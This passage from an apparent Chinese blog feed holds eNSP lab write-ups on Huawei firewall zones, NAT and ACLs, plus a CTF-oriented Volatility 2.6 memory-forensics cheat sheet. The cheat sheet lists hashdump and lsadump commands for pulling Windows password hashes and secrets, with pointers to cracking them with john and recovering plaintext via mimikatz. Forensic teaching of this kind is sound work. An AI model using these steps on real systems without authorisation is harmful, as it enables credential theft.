class=\"line\">[FW1-GigabitEthernet1/0/0]service-manage ping permit</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[FW1]int g1/0/1</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]service-manage enable </span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]service-manage ping permit </span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>4.然后配置不同的安全区域并加入对应的端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]firewall zone trust</span><br><span class=\"line\">[FW1-zone-trust]add interface g1/0/0</span><br><span class=\"line\">[FW1-zone-trust]quit</span><br><span class=\"line\">[FW1]firewall zone untrust</span><br><span class=\"line\">[FW1-zone-untrust]add interface g1/0/1</span><br><span class=\"line\">[FW1-zone-untrust]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>5.然后开始配置安全策略，使pc1可以ping通pc2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]security-policy</span><br><span class=\"line\">[FW1-policy-security]rule name 1</span><br><span class=\"line\">[FW1-policy-security-rule-1]source-address 10.1.2.1 mask 255.255.255.0</span><br><span class=\"line\">[FW1-policy-security-rule-1]destination-address 2.2.2.2 mask 255.255.255.0</span><br><span class=\"line\">[FW1-policy-security-rule-1]service icmp</span><br><span class=\"line\">[FW1-policy-security-rule-1]action permit</span><br><span class=\"line\">[FW1-policy-security-rule-1]quit</span><br></pre></td></tr></table></figure>\n\n<p>然后进行验证，结果应当是pc1可以ping通pc2，但是pc2无法ping通pc1</p>\n<h2 id=\"实验拓扑图三：\"><a href=\"#实验拓扑图三：\" class=\"headerlink\" title=\"实验拓扑图三：\"></a>实验拓扑图三：</h2><p><img src=\"/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416104546562.png\" alt=\"image-20240416104546562\"></p>\n<h2 id=\"实验过程：-2\"><a href=\"#实验过程：-2\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.首先配置pc机的ip网关以及各个设备的端口的ip，具体如上图</p>\n<p>这边就不在展示了，很基础的，就给各个端口配各ip，注意不要漏了，这里就先只配ip，其他的暂时不要动，跟着后面的步骤走</p>\n<p>2.然后开始配置两个防火墙的端口的service-manage</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]int g1/0/0</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]service-manage enable </span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]service-manage ping permit </span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[FW1]int g1/0/1</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]service-manage enable </span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]service-manage ping permit </span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2]int g1/0/0</span><br><span class=\"line\">[FW2-GigabitEthernet1/0/0]service-manage enable </span><br><span class=\"line\">[FW2-GigabitEthernet1/0/0]service-manage ping permit </span><br><span class=\"line\">[FW2-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[FW2]int g1/0/1</span><br><span class=\"line\">[FW2-GigabitEthernet1/0/1]service-manage enable </span><br><span class=\"line\">[FW2-GigabitEthernet1/0/1]service-manage ping permit</span><br><span class=\"line\">[FW2-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>3.然后配置安全区域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]firewall zone trust </span><br><span class=\"line\">[FW1-zone-trust]add interface g1/0/0</span><br><span class=\"line\">[FW1-zone-trust]quit</span><br><span class=\"line\">[FW1]firewall zone untrust </span><br><span class=\"line\">[FW1-zone-untrust]add interface g1/0/1</span><br><span class=\"line\">[FW1-zone-untrust]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2]firewall zone trust </span><br><span class=\"line\">[FW2-zone-trust]add interface g1/0/0</span><br><span class=\"line\">[FW2-zone-trust]quit</span><br><span class=\"line\">[FW2]firewall zone untrust \t</span><br><span class=\"line\">[FW2-zone-untrust]add interface g1/0/1</span><br><span class=\"line\">[FW2-zone-untrust]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>4.然后配置安全策略</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]security-policy</span><br><span class=\"line\">[FW1-policy-security]rule name 1</span><br><span class=\"line\">[FW1-policy-security-rule-1]source-address 10.18.1.1 mask 255.255.255.0</span><br><span class=\"line\">[FW1-policy-security-rule-1]destination-address 10.18.2.1 mask 255.255.255.0</span><br><span class=\"line\">[FW1-policy-security-rule-1]service icmp</span><br><span class=\"line\">[FW1-policy-security-rule-1]action permit </span><br><span class=\"line\">[FW1-policy-security-rule-1]quit</span><br><span class=\"line\">[FW1-policy-security]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2]security-policy</span><br><span class=\"line\">[FW2-policy-security]rule name 1</span><br><span class=\"line\">[FW2-policy-security-rule-1]source-address 10.18.1.1 mask 255.255.255.0</span><br><span class=\"line\">[FW2-policy-security-rule-1]destination-address 10.18.2.1 mask 255.255.255.0</span><br><span class=\"line\">[FW2-policy-security-rule-1]service icmp</span><br><span class=\"line\">[FW2-policy-security-rule-1]action permit</span><br><span class=\"line\">[FW2-policy-security-rule-1]quit</span><br><span class=\"line\">[FW2-policy-security]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>5.最后开始配置ospf，保证网络的连通</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[AR1]ospf 1</span><br><span class=\"line\">[AR1-ospf-1]area 0</span><br><span class=\"line\">[AR1-ospf-1-area-0.0.0.0]network 10.18.11.0 0.0.0.255</span><br><span class=\"line\">[AR1-ospf-1-area-0.0.0.0]network 10.18.12.0 0.0.0.255</span><br><span class=\"line\">[AR1-ospf-1-area-0.0.0.0]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]ospf 1</span><br><span class=\"line\">[FW1-ospf-1]area 0</span><br><span class=\"line\">[FW1-ospf-1-area-0.0.0.0]network 10.18.11.0 0.0.0.255</span><br><span class=\"line\">[FW1-ospf-1-area-0.0.0.0]quit</span><br><span class=\"line\">[FW1-ospf-1]area 1</span><br><span class=\"line\">[FW1-ospf-1-area-0.0.0.1]network 10.18.1.0 0.0.0.255</span><br><span class=\"line\">[FW1-ospf-1-area-0.0.0.1]quit</span><br><span class=\"line\">[FW1-ospf-1]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW2]ospf 1</span><br><span class=\"line\">[FW2-ospf-1]area 0</span><br><span class=\"line\">[FW2-ospf-1-area-0.0.0.0]network 10.18.12.0 0.0.0.255</span><br><span class=\"line\">[FW2-ospf-1-area-0.0.0.0]quit</span><br><span class=\"line\">[FW2-ospf-1]area 1</span><br><span class=\"line\">[FW2-ospf-1-area-0.0.0.1]network 10.18.2.0 0.0.0.255</span><br><span class=\"line\">[FW2-ospf-1-area-0.0.0.1]quit</span><br><span class=\"line\">[FW2-ospf-1]quit</span><br></pre></td></tr></table></figure>\n\n<p>然后进行测试，结果为pc1可以ping通pc2，但是pc2无法ping通pc1</p>\n",
            "tags": [
                "原创",
                "网基",
                "eNSP"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/",
            "url": "https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/",
            "title": "网基实践题-NAT",
            "date_published": "2024-04-09T14:56:26.651Z",
            "content_html": "<h1 id=\"网基实践题-NAT\"><a href=\"#网基实践题-NAT\" class=\"headerlink\" title=\"网基实践题-NAT\"></a>网基实践题-NAT</h1><p><a href=\"https://so.csdn.net/so/search?q=ensp&spm=1001.2101.3001.7020\">ensp</a>中NAT种类的分类</p>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>static NAT （静态NAT）</td>\n<td>一个私网地址只能够对应一个公网IP地址</td>\n</tr>\n<tr>\n<td>easy IP （动态NAT）</td>\n<td>多个私网地址对应一个公网地址</td>\n</tr>\n<tr>\n<td>NAT Server</td>\n<td>外网客户端访问内网服务器时就会用到这个</td>\n</tr>\n</tbody></table>\n<p>私网IP地址的范围</p>\n<figure class=\"highlight handlebars\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"language-xml\">A类地址:10.0.0.0～10.255.255.255 </span></span><br><span class=\"line\"><span class=\"language-xml\">B类地址:172.16.0.0 ～172.31.255.255 </span></span><br><span class=\"line\"><span class=\"language-xml\">C类地址:192.168.0.0～192.168.255.255</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"实验拓扑图：\"><a href=\"#实验拓扑图：\" class=\"headerlink\" title=\"实验拓扑图：\"></a>实验拓扑图：</h2><p><img src=\"/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/image-20240409215941199.png\" alt=\"image-20240409215941199\"></p>\n<h2 id=\"实验过程：\"><a href=\"#实验过程：\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.首先按照上图将PC机以及相关的路由器各个端口进行配置</p>\n<p>AR1配置如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Huawei&gt;sys</span><br><span class=\"line\">[Huawei]sysname AR1</span><br><span class=\"line\">[AR1]int g0/0/0</span><br><span class=\"line\">[AR1-GigabitEthernet0/0/0]ip address 7.7.7.7 24</span><br><span class=\"line\">[AR1-GigabitEthernet0/0/0]quit</span><br><span class=\"line\">[AR1]int g0/0/1</span><br><span class=\"line\">[AR1-GigabitEthernet0/0/1]ip address 192.168.1.1 24</span><br><span class=\"line\">[AR1-GigabitEthernet0/0/1]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>AR2配置如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Huawei&gt;sys</span><br><span class=\"line\">[Huawei]sysname AR2</span><br><span class=\"line\">[AR2]int g0/0/0</span><br><span class=\"line\">[AR2-GigabitEthernet0/0/0]ip address 7.7.7.1 24</span><br><span class=\"line\">[AR2-GigabitEthernet0/0/0]int g0/0/1</span><br><span class=\"line\">[AR2-GigabitEthernet0/0/1]ip address 8.8.8.1 24</span><br><span class=\"line\">[AR2-GigabitEthernet0/0/1]int g0/0/2</span><br><span class=\"line\">[AR2-GigabitEthernet0/0/2]ip address 9.9.9.1 24</span><br><span class=\"line\">[AR2-GigabitEthernet0/0/2]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>2.然后AR1需要配置缺省路由，又叫默认路由（比较特殊的静态路由）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[AR1]ip route-static 0.0.0.0 0.0.0.0 7.7.7.1</span><br></pre></td></tr></table></figure>\n\n\n\n<p>3.然后配置规则，配置nat</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[AR1]acl number 2000</span><br><span class=\"line\">[AR1-acl-basic-2000]rule 5 permit source 192.168.1.0 0.0.0.255</span><br><span class=\"line\">[AR1-acl-basic-2000]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[AR1-GigabitEthernet0/0/0]nat server protocol tcp global current-interface 80 inside 192.168.1.200 80\t#这个配置的是NAT Server，将内网服务器192.168.1.200的80端口映射到当前端口公有地址7.7.7.7的80端口</span><br><span class=\"line\">[AR1-GigabitEthernet0/0/0]nat static global 7.7.7.0 inside 192.168.1.0\t#这一行命令和上面的二选一就行，这个是配置静态NAT的，还需要命令nat static enable</span><br><span class=\"line\">[AR1-GigabitEthernet0/0/0]nat outbound 2000</span><br></pre></td></tr></table></figure>\n\n\n\n<p>然后就可以发现内网的pc1和pc2是可以ping通外网的外网的却无法ping内网</p>\n<p>具体命令解析：</p>\n<p><code>nat static global 7.7.7.2 inside 192.168.1.100 </code>     将内网IP地址为192.168.1.100的主机访问外网时，交给公网IP地址7.7.7.2去处理（注：这个公网IP地址是自己指定的）</p>\n<p><code>nat server protocol tcp global current-interface 80 inside 192.168.1.200 80</code> 的具体解析如下：</p>\n<p>protocol tcp: 这表示NAT服务器将使用TCP协议进行流量转发。</p>\n<ul>\n<li>global current-interface 80: 这部分配置定义了全局地址和端口号。<ul>\n<li>global: 表示这是一个全局地址，即用于外部网络访问的地址。</li>\n<li>current-interface: 表示使用当前接口（通常是连接到外部网络的接口）的IP地址作为全局地址。这通常用于动态获取接口的公网IP地址。</li>\n<li>80: 这是外部网络访问内部服务器时所使用的端口号。在这里，它设置为HTTP服务的标准端口号80。</li>\n</ul>\n</li>\n<li>inside 192.168.1.200 80: 这部分配置定义了内部服务器的地址和端口号。<ul>\n<li>inside: 表示这是一个内部地址，即内部网络中服务器的地址。</li>\n<li>192.168.1.200: 这是内部服务器的IP地址。</li>\n<li>80: 这是内部服务器上运行的服务所监听的端口号。在这里，它同样设置为80，表示内部服务器正在监听HTTP服务。</li>\n</ul>\n</li>\n</ul>\n<p>综上所述，这条命令的作用是配置一个NAT服务器映射，使得外部网络可以通过当前接口的公网IP地址的80端口访问内部网络中IP地址为192.168.1.200的服务器的80端口（通常是HTTP服务）。</p>\n<p>在配置NAT服务器之前，请确保：</p>\n<ol>\n<li>内部服务器已经启动并且服务（在这里是HTTP服务）正在监听指定的端口。</li>\n<li>设备的外部接口已经配置并获得了有效的公网IP地址。</li>\n<li>设备的路由配置允许外部流量到达NAT服务器映射。</li>\n<li>防火墙规则允许相关的TCP流量通过。</li>\n</ol>\n",
            "tags": [
                "原创",
                "网基",
                "eNSP"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/",
            "url": "https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/",
            "title": "网基实践题-ACL",
            "date_published": "2024-04-09T13:47:03.460Z",
            "content_html": "<p><strong>ACL的分类</strong></p>\n<table>\n<thead>\n<tr>\n<th>基本ACL（2000-2999）</th>\n<th>根据源地址来进行访问控制</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>高级ACL（3000-3999）</td>\n<td>可以根据源地址、目标地址、源端口号等来进行访问控制</td>\n</tr>\n</tbody></table>\n<p>注：我们在不管在配置什么ACL的时候，需先保证全网互通，然后在根据需要来进行设置ACL访问控制</p>\n<h1 id=\"网基实践题-ACL\"><a href=\"#网基实践题-ACL\" class=\"headerlink\" title=\"网基实践题-ACL\"></a>网基实践题-ACL</h1><h2 id=\"实验拓扑图：\"><a href=\"#实验拓扑图：\" class=\"headerlink\" title=\"实验拓扑图：\"></a>实验拓扑图：</h2><img src=\"/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409211406928.png\" alt=\"image-20240409211406928\" style=\"zoom: 33%;\">\n\n<h2 id=\"实验过程：\"><a href=\"#实验过程：\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.首先保证PC1和PC2能够互通（具体的就不写了，基本的）</p>\n<img src=\"/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409211921518.png\" alt=\"image-20240409211921518\" style=\"zoom:50%;\">\n\n\n\n<p>2.配置访问控制列表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[AR1]acl number 2000 [match-order auto|config] #这里我是设置的auto</span><br><span class=\"line\">[AR1-acl-basic-2000]rule deny source 1.1.1.10 0</span><br><span class=\"line\">[AR1-acl-basic-2000]rule permit source 1.1.1.0 0.0.0.255 #实际上这个规则是不起作用的，只是方便理解什么是‘深度优先’。上面的设置如果不是auto而是config的话，要加上id号，即rule id [deny|permit]......</span><br><span class=\"line\">[AR1-acl-basic-2000]display this\t#这一步也可以忽略，这里只是列出来方便理解</span><br><span class=\"line\">#acl number 2000  match-order auto</span><br><span class=\"line\"># rule 5 deny source 1.1.1.10 0 </span><br><span class=\"line\"># rule 10 permit source 1.1.1.0 0.0.0.255</span><br><span class=\"line\">[AR1-acl-basic-2000]int g0/0/0\t#进入端口，引用规则</span><br><span class=\"line\">[AR1-GigabitEthernet0/0/0]traffic-filter inbound acl 2000</span><br></pre></td></tr></table></figure>\n\n\n\n<p>配置完成之后可以发现PC1的流量没法出去了</p>\n<img src=\"/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409214259683.png\" alt=\"image-20240409214259683\" style=\"zoom:50%;\">\n\n\n\n\n\n<p>具体解析：</p>\n<p><code>match-order auto</code>：这个参数设置ACL规则的匹配顺序为自动。当设置为“自动”时，系统将按照“深度优先”的顺序自动对规则进行排序。如果“深度优先”的顺序相同，则按照rule-id由小到大的顺序进行匹配。</p>\n<p>当您在创建ACL时指定 <code>match-order config</code>，这意味着ACL规则将按照您在配置中指定的顺序进行匹配。这意味着规则的顺序对于过滤决策至关重要，因为系统会根据规则在配置中出现的顺序来依次评估它们。</p>\n<p>需要注意的是，如果在创建ACL时没有明确指定 <code>match-order</code> 参数，那么默认的规则匹配顺序通常是 <code>config</code></p>\n<p>ACL的inbound和outbound有什么区别：</p>\n<p>inbound和outbound的主要区别在于它们处理网络流量的方向不同。</p>\n<p>Inbound（入站）是指从外部网络（例如Internet）进入本地网络中的数据流量。这种方向的ACL规则主要用于保护内部网络资源免受未经授权的访问和攻击。</p>\n<p>Outbound（出站）则是指从本地网络向外部网络发送的数据流量。这种方向的ACL规则主要用于控制内部网络向外部发送的数据，以防止敏感信息的泄露或不合规的外部访问。</p>\n<p>Inbound方向更侧重于保护内部网络资源，而outbound方向则更侧重于控制内部网络向外部的流量。</p>\n",
            "tags": [
                "原创",
                "网基",
                "eNSP"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/03/25/tools/Volatility2.6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/",
            "url": "https://w-sqrt7.github.io/2024/03/25/tools/Volatility2.6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/",
            "title": "Volatility2.6的使用方法",
            "date_published": "2024-03-25T08:54:17.301Z",
            "content_html": "<h1 id=\"Volatility2-6的使用方法\"><a href=\"#Volatility2-6的使用方法\" class=\"headerlink\" title=\"Volatility2.6的使用方法\"></a>Volatility2.6的使用方法</h1><p>原文链接：<a href=\"https://wiki.wgpsec.org/knowledge/ctf/Volatility.html\">https://wiki.wgpsec.org/knowledge/ctf/Volatility.html</a></p>\n<p>原文链接：<a href=\"https://blog.csdn.net/m0_68012373/article/details/127419463\">https://blog.csdn.net/m0_68012373/article/details/127419463</a></p>\n<h2 id=\"命令格式\"><a href=\"#命令格式\" class=\"headerlink\" title=\"命令格式\"></a>命令格式</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f [image] --profile=[profile] [plugin]</span><br><span class=\"line\"></span><br><span class=\"line\">volatility -f [对象] --profile=[操作系统] [插件参数]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在分析之前，需要先判断当前的镜像信息，分析出是哪个操作系统，命令imageinfo即可获取镜像信息。</p>\n<pre><code>Volatility -f xxx.vmem imageinfo\n</code></pre>\n<p>在查到操作系统后如果不确定可以使用以下命令查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility - f xxx.vmem --profile= [操作系统] volshell</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><p>输入<strong>vol.py –info</strong>可查看插件</p>\n<p>1.查看当前内存镜像中的用户\tprintkey -K “SAM\\Domains\\Account\\Users\\Names”</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem –profile=Win7SP1x64 printkey -K “SAM\\Domains\\Account\\Users\\Names”</span><br></pre></td></tr></table></figure>\n\n\n\n<p>2.查看用户名密码信息(密码是哈希值，需要john爆破)\t hashdump</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure>\n\n<p>查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)</p>\n<p>3.如果john爆破不出来，就使用 lasdmp 查看强密码\t lsadmp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 lsadump</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>4.查看进程\tpslist</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure>\n\n<p>pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</p>\n<p>5.查看已知进程\tpslist</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 pslist -p 2588</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>6.隐藏或解链的进程\tpsscan</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 psscan</span><br></pre></td></tr></table></figure>\n\n<p>psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</p>\n<p><strong>7.查看服务，查询服务名称\tsvcscan</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 svcscan</span><br></pre></td></tr></table></figure>\n\n<p>svcscan：扫描 Windows 的服务</p>\n<p>8.查看浏览器历史记录,获取当前系统浏览器搜索过的关键词\t iehistory</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 iehistory</span><br></pre></td></tr></table></figure>\n\n\n\n<p>9.查看网络连接 获取当前系统 ip netscan </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>\n\n<p>有一些版本 这个命令是使用不了 这里我们就要使用（connscan,connections)</p>\n<p>volatility -f win7.vmem –profile&#x3D;Win7SPIx64 netscan |grep ESTABLISHED  查看网络通信连接</p>\n<p>10.查看网络连接connscan</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 connscan</span><br></pre></td></tr></table></figure>\n\n<p>connscan：查看网络连接</p>\n<p>11.查看网络连接connections</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 connections</span><br></pre></td></tr></table></figure>\n\n<p>connections：查看网络连接</p>\n<p><strong>12.查看命令行操作，显示cmd历史命令 cmdscan</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f 1.vmem --profile=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure>\n\n<p>cmdscan：可用于查看终端记录</p>\n<p>13.查看进程命令行参数（具体一些可疑进程的参数指令）cmdline</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility 